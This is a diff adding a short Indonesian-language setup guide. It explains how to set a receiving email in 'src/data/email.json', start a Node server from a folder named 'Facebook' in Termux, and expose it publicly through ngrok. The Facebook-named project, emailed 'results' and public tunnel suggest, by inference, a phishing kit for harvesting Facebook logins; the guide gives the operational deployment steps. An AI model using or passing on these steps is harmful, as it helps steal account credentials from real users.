@@ -1,0 +1,13 @@
+PENTING:
+- Edit file 'email.json' ubah jadi email yg mau terima result. Lokasi file: 'src/data/email.json'.
+- Pastikan Termux sudah terinstall Ngrok/Cloudflare.
+
+CARA PAKAI MENGGUNAKAN TERMUX + NGROK:
+- pkg update && pkg upgrade
+- pkg install nodejs
+- cd /storage/emulated/0/Download/Facebook
+- clear
+- npm start
+- Buka sesi baru di Termux dan biarkan server nya tetap running
+- ngrok http 3000
+- Tunggu sampai konek dan muncul link https
